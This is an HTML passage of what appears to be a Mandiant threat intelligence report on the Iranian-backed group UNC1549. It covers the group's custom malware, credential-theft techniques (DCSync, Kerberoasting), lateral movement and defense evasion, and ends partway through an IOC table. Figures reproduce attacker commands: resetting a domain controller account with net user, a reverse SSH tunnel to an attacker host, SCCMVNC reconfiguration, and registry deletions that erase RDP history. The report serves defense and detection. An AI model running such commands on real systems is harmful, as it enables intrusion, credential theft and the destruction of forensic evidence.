style=\"vertical-align: baseline;\">GHOSTLINE is a Windows tunneler utility written in Golang that uses a hard-coded domain for its communication. GHOSTLINE uses the </span><a href=\"https://github.com/hashicorp/yamux\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">go-yamux</span></a><span style=\"vertical-align: baseline;\"> library for its network connection.</span></p>\n<h4><span style=\"vertical-align: baseline;\">POLLBLEND</span></h4>\n<p><span style=\"vertical-align: baseline;\">POLLBLEND is a Windows tunneler that is written in C++. Earlier iterations of POLLBLEND featured multiple hardcoded C2 servers and utilized two hardcoded URI parameters for self-registration and tunneler configuration download. For the registration of the machine, POLLBLEND would reach out to</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">/register/</code><span style=\"vertical-align: baseline;\"> and sent a HTTP POST request with the following JSON body.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>{\"username\": \"&lt;computer_name&gt;\"}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 4: POLLBLEND body data</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Code Signing</span></h4>\n<p><span style=\"vertical-align: baseline;\">Throughout the tracking of UNC1549\u2019s activity across multiple intrusions, the Iranian-backed threat group was observed signing some of their backdoor binaries with legitimate code-signing certificates\u2014a tactic also covered by </span><a href=\"https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Check Point</span></a><span style=\"vertical-align: baseline;\">\u2014likely to help their malware evade detection and bypass security controls like application allowlists, which are often configured to trust digitally signed code. The group employed this technique to weaponize malware samples, including variants for GHOSTLINE, POLLBLEND, and TWOSTROKE. All identified code-signing certificates have been reported to the relevant issuing Certificate Authorities for revocation.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Escalate Privileges</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 has been observed using a variety of techniques and custom tools aimed at stealing credentials and gathering sensitive data post-compromise. This included a utility, tracked as DCSYNCER.SLICK, designed to mimic the DCSync Active Directory replication feature. DCSync is a legitimate function domain controllers use for replicating changes via </span><a href=\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">RPC</span></a><span style=\"vertical-align: baseline;\">. This allowed the attackers to extract NTLM password hashes directly from the domain controllers. Another tool, dubbed CRASHPAD, focused on extracting credentials saved within web browsers. For visual data collection, they deployed SIGHTGRAB, a tool capable of taking periodic screenshots, potentially capturing sensitive information displayed on the user's screen. Additionally, UNC1549 utilized simpler methods, such as deploying TRUSTTRAP, which presented fake popup windows prompting users to enter their credentials, which were then harvested by the attackers.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549 frequently used DCSync attacks to obtain NTLM password hashes for domain users, which they then cracked in order to facilitate lateral movement and privilege escalation. To gain the necessary directory replication rights for DCSync, the threat actor employed several methods. They were observed unconventionally resetting passwords for domain controller computer accounts using </span><code style=\"vertical-align: baseline;\">net.exe</code><span style=\"vertical-align: baseline;\">. This action typically broke the domain controller functionality of the host and caused an outage, yet it successfully enabled them to perform the DCSync operation and extract sensitive credentials, including those for domain administrators and Azure AD Connect accounts. UNC1549 leveraged other techniques to gain domain replication rights, including creating rogue computer accounts and abusing Resource-Based Constrained Delegation (RBCD) assignments. They also performed Kerberoasting, utilizing obfuscated </span><code style=\"vertical-align: baseline;\">Invoke-Kerberoast</code><span style=\"vertical-align: baseline;\"> scripts, for credential theft.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>net user DC-01$ P@ssw0rd</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 5: Example of an UNC1549 net.exe command to reset a domain controller computer account</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In some cases, shortly after gaining a foothold on workstations, UNC1549 discovered vulnerable Active Directory Certificate Services templates. They used these to request certificates, allowing them to impersonate higher-privileged user accounts.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549 also frequently targeted saved credentials within web browsers, either through malicious utilities or by RDP session hijacking. In the latter, the threat actor would identify which user was logged onto a system through quser.exe or wmic.exe, and then RDP to that system with the user's account to gain access to their active and unlocked web browser sessions.</span></p>\n<h4><span style=\"vertical-align: baseline;\">DCSYNCER.SLICK</span></h4>\n<p><span style=\"vertical-align: baseline;\">DCSYNCER.SLICK is a Windows executable that is based on the Open source Project </span><a href=\"https://github.com/notsoshant/DCSyncer/tree/master\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">DCSyncer</span></a><span style=\"vertical-align: baseline;\"> and is based on Mimikatz source code. DCSYNCER.SLICK has been modified to use Dynamic API resolution and has all its printf statements removed.</span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, DCSYNCER.SLICK collects and XOR-encrypts the credentials before writing them to a hardcoded filename and path. The following hardcoded filenames and paths were observed being used by DCSYNCER.SLICK:</span></p>\n<ul>\n<li><code style=\"vertical-align: baseline;\">C:\\users\\public\\LOG.txt</code></li>\n<li><code style=\"vertical-align: baseline;\">C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\LOG.txt</code></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To evade detection, UNC1549 executed the malware within the context of a compromised domain controller computer account. They achieved this compromise by manually resetting the account password. Instead of utilizing the standard</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">netdom</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">command, UNC1549 used the Windows command</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">net user &lt;computer_name&gt; &lt;password&gt;</code><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">Subsequently, they used these newly acquired credentials to execute the DCSYNCER.SLICK payload. This tactic would give the false impression that replication had occurred between two legitimate domain controllers.</span></p>\n<h4><span style=\"vertical-align: baseline;\">CRASHPAD</span></h4>\n<p><span style=\"vertical-align: baseline;\">CRASHPAD is a Windows executable that is written in C++ that decrypts the content of the file </span><code style=\"vertical-align: baseline;\">config.txt</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">into the file </span><code style=\"vertical-align: baseline;\">crash.log</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">by impersonating the </span><code style=\"vertical-align: baseline;\">explorer.exe</code><span style=\"vertical-align: baseline;\"> user privilege and through the </span><code style=\"vertical-align: baseline;\">CryptUnprotectData</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">API</span><span style=\"vertical-align: baseline;\">. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\crash.log</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\config.txt</code></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The contents of these files could not be determined because UNC1549 deleted the output after CRASHPAD was executed.</span></p>\n<p><span style=\"vertical-align: baseline;\">The CRASHPAD configuration and output file paths were hardcoded into the sample, similar to the </span><code style=\"vertical-align: baseline;\">LOG.txt</code><span style=\"vertical-align: baseline;\"> filename found in the DCSYNCER.SLICK binary.</span></p>\n<h4><span style=\"vertical-align: baseline;\">SIGHTGRAB</span></h4>\n<p><span style=\"vertical-align: baseline;\">SIGHTGRAB is a Windows executable written in C that autonomously captures screen shots at regular intervals and saves them to disk. Upon execution SIGHTGRAB loads several Windows libraries dynamically at runtime including </span><code style=\"vertical-align: baseline;\">User32.dll</code><span style=\"vertical-align: baseline;\">,</span><code style=\"vertical-align: baseline;\"> Gdi32.dll</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">Ole32.dll</code><span style=\"vertical-align: baseline;\">. SIGHTGRAB implements runtime API resolution through </span><code style=\"vertical-align: baseline;\">LoadLibraryA</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">GetProcAddress</code><span style=\"vertical-align: baseline;\"> calls with encoded strings to access system functions. SIGHTGRAB uses XOR encryption with a single-byte key of </span><code style=\"vertical-align: baseline;\">0x41</code><span style=\"vertical-align: baseline;\"> to decode API function names.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">SIGHTGRAB retrieves the current timestamp and uses string interpolation of </span><code style=\"vertical-align: baseline;\">YYYY-MM-DD-HH-MM</code><span style=\"vertical-align: baseline;\"> on the timestamp to generate the directory name. In this newly created directory, SIGHTGRAB saves all the taken screenshots incrementally.</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Users\\Public\\Videos\\2025-3-7-10-17\\1.jpg\nC:\\Users\\Public\\Videos\\2025-3-7-10-17\\2.jpg\nC:\\Users\\Public\\Videos\\2025-3-7-10-17\\3.jpg\n\nC:\\Users\\Public\\Music\\2025-3-7-10-17\\1.jpg\nC:\\Users\\Public\\Music\\2025-3-7-10-17\\2.jpg\nC:\\Users\\Public\\Music\\2025-3-7-10-17\\3.jpg</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 6: Examples of screenshot files created by </span><span style=\"vertical-align: baseline;\">SIGHTGRAB</span><span style=\"vertical-align: baseline;\"> on disk</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant observed UNC1549 strategically deploy SIGHTGRAB on workstations to target users in two categories: those handling sensitive data, allowing for subsequent data exposure and exfiltration, and those with privileged access, enabling privilege escalation and access to restricted systems.</span></p>\n<h4><span style=\"vertical-align: baseline;\">TRUSTTRAP</span></h4>\n<p><span style=\"vertical-align: baseline;\">A malware that serves a Windows prompt to trick the user into submitting their credentials. The captured credentials are saved in cleartext to a file. Figure 7 shows a sample popup by TRUSTTRAP mimicking the Microsoft Outlook login window.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"Screenshot showing the fake Microsoft Outlook login window\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc1549-ttps-fig7.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Screenshot showing the fake Microsoft Outlook login window</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">TRUSTTRAP has been used by UNC1549 since at least 2023 for obtaining user credentials used for lateral movement.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Reconnaissance and Lateral Movement</span></h3>\n<p><span style=\"vertical-align: baseline;\">For internal reconnaissance, UNC1549 leveraged legitimate tools and publicly available utilities, likely to blend in with standard administrative activities. </span><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AD Explorer</span></a><span style=\"vertical-align: baseline;\">, a valid executable signed by Microsoft, was used to query Active Directory and inspect its configuration details. Alongside this, the group employed native Windows commands like </span><code style=\"vertical-align: baseline;\">net user</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">net group</code><span style=\"vertical-align: baseline;\"> to enumerate specific user accounts and group memberships within the domain, and PowerShell scripts for ping and port scanning reconnaissance on specific subnets, typically those associated with privileged servers or IT administrator workstations\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549 uses a wide variety of methods for lateral movement, depending on restrictions within the victim environment. Most frequently, RDP was used. Mandiant also observed the use of PowerShell Remoting, Atelier Web Remote Commander (\u201cAWRC\u201d), and SCCM remote control, including execution of variants of SCCMVNC to enable SCCM remote control on systems.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Atelier Web Remote Commander</span></h4>\n<p><span style=\"vertical-align: baseline;\">Atelier Web Remote Commander (AWRC) is a commercial utility for remotely managing, auditing, and supporting Windows systems. Its key distinction is its agentless design, meaning it requires no software installation or pre-configuration on the remote machine, enabling administrators to connect immediately.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Leveraging the capabilities of AWRC, UNC1549 utilized this publicly available commercial tool to facilitate post-compromise activities. These activities included:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Established remote connections: Used AWRC to connect remotely to targeted hosts within the compromised network</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Conducted reconnaissance: Employed AWRC's built-in functions to gather information by:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerating running services</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerating active processes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enumerating existing RDP sessions</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Stole credentials: Exploited AWRC to exfiltrate sensitive browser files known to contain stored user credentials from remote systems</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deployed malware: Used AWRC as a vector to transfer and deploy malware onto compromised machines</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">SCCMVNC</span></h4>\n<p><a href=\"https://github.com/netero1010/SCCMVNC\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">SCCMVNC</span></a><span style=\"vertical-align: baseline;\"> is a tool designed to leverage the existing Remote Control feature within Microsoft System Center Configuration Manager (SCCM/ConfigMgr) to achieve a VNC-like remote access experience without requiring additional third-party modules or user consent/notifications.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>SCCM.exe reconfig /target:[REDACTED]</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 8: Example of an UNC1549 executing SCCMVNC command</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The core functionality of SCCMVNC lies in its ability to manipulate the existing Remote Control feature of SCCM. Instead of deploying a separate VNC server or other remote access software, the tool directly interacts with and reconfigures the settings of the native SCCM Remote Control service on a client workstation. This approach leverages an already present and trusted component within the enterprise environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">A key aspect of SCCMVNC is its capacity to bypass the standard consent and notification mechanisms typically associated with SCCM Remote Control. Normally, when an SCCM remote control session is initiated, the end-user is prompted for permission, and various notification icons or connection bars are displayed. SCCMVNC effectively reconfigures the underlying SCCM settings (primarily through WMI interactions) to disable these user-facing requirements. This alteration allows for a significantly more discreet and seamless remote access experience, akin to what one might expect from a VNC connection where the user might not be immediately aware of the ongoing session.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Command and Control</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 continued to use Microsoft Azure Web Apps registrations and cloud infrastructure for C2. In addition to backdoors including MINIBUS, MINIBIKE, and TWOSTROKE, UNC1549 relied heavily on SSH reverse tunnels established on compromised systems to forward traffic from their C2 servers to compromised systems. This technique limited the availability of host-based artifacts during investigations, since security telemetry would only record network connections. For example, during data collection from SMB shares, outbound connections were observed from the SSH processes to port 445 on remote systems, but the actual data collected could not be confirmed due to no staging taking place within the victim environment, and object auditing being disabled.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 9: Example of an UNC1549 reverse SSH comman</span><span style=\"vertical-align: baseline;\">d</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant also identified evidence of UNC1549 deploying a variety of redundant remote access methods, including ZEROTIER and NGROK. In some instances, these alternative methods weren't used by the threat actor until victim organizations had performed remediation actions, suggesting they are primarily deployed to retain access.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Complete Mission</span></h3>\n<h4><span style=\"vertical-align: baseline;\">Espionage</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC1549's operations appear strongly motivated by espionage, with mission objectives centering around extensive data collection from targeted networks. The group actively seeks sensitive information, including network/IT documentation, intellectual property, and emails. Furthermore, UNC1549 often leverages compromised organizations as a pivot point, using their access to target other entities, particularly those within the same industry sector, effectively conducting third-party supplier and partner intrusions to further their intelligence-gathering goals.</span></p>\n<p><span style=\"vertical-align: baseline;\">Notably, Mandiant responded to one intrusion at an organization in an unrelated sector, and assessed that the intrusion was opportunistic due to the initial spear phishing lure being related to a job at an aerospace and defense organization. This demonstrated UNC1549\u2019s ability to commit resources to expanding access and persistence in victim organizations that don\u2019t immediately meet traditional espionage goals.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Defense Evasion</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 frequently deleted utilities from compromised systems after execution to avoid detection and hinder investigation efforts. The deletion of forensic artifacts, including RDP connection history registry keys, was also observed. Additionally, as described earlier, the group repeatedly used SSH reverse tunnels from victim hosts back to their infrastructure, a technique which helped hide their activity from EDR agents installed on those systems. Combined, this activity demonstrated an increase in the operational security of UNC1549 over the past year.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\n\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 10: Examples of UNC1549 commands to delete RDP connection history registry keys</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Acknowledgement</span></h3>\n<p><span style=\"vertical-align: baseline;\">This analysis would not have been possible without the assistance from across Google Threat Intelligence Group, Mandiant Consulting and FLARE. We would like to specifically thank Greg Sinclair and Mustafa Nasser from FLARE, and Melissa Derr, Liam Smith, Chris Eastwood, Alex Pietz, Ross Inman, and Emeka Agu from Mandiant Consulting.</span></p>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">MITRE ATT&amp;CK</span></span></h3></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">TACTIC</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ID</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Name</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Collection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1213.002</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Data from Information Repositories: SharePoint</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 browsed Microsoft Teams and SharePoint to download files used for extortion.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Collection</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1113</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Screen Capture</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed making screenshots from sensitive data.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reconnaissance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T16561598.003</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing for Information</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 used third party vendor accounts to obtain privileged accounts using a Password Reset portal theme.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1110.003</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Brute Force: Password Spraying</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed performing password spray attacks against the Domain.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1003.006</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">OS Credential Dumping: DCSync</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed using DCSYNCER.SLICK to perform DCSync on domain controller level.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Defense Evasion</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1574.001</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Hijack Execution Flow: DLL Search Order Hijacking</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed using Search Order Hijacking to execute both LIGHTRAIL and DCSYNCER.SLICK.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Initial Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1078</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Valid Accounts</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 used valid compromised accounts to gain initial access</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Initial Access</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">T1199</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Trusted Relationship</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">UNC1549 used trusted third party vendor accounts for both initial access and lateral movement.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">The <a href=\"https://www.virustotal.com/gui/collection/395ae8a72896c38d2280dd4f838341d68b0bcd7a5da89752e3c2e53ccf0da235\" rel=\"noopener\" target=\"_blank\">following IOCs are available in a GTI Collection</a> for registered users.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">104.194.215[.]88</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">13.60.50[.]172</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">167.172.137[.]208</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed being used for SSH tunneling</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">network</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">34.18.42[.]26</span></p>\n</td>\n<td style=\"vertical-align: 